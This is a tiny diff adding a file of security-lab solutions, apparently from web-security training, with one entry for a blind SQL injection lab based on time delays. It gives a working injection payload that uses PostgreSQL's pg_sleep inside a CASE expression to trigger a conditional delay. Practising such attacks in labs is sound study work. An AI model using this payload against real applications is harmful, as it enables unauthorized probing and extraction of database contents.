@@ -1,0 +1,6 @@
+This file contains solutions to labs for which no script was written. 
+
+# Lab: Blind SQL injection with time delays
+Payload used:
+'||(SELECT CASE WHEN (4<5) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'
+
